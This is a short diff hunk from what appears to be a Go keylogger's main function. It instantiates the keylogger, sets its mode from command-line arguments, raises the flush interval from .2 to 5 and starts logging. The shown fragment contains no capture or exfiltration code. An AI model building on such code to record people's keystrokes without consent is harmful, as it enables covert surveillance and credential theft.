@@ -25,8 +25,9 @@ func main() {
 		}
 
 		k := createKeylogger()
+
 		k.setMode(mode, args[2])
-		k.setFlushInterval(.2)
+		k.setFlushInterval(5)
 
 		k.start(time)
 	}
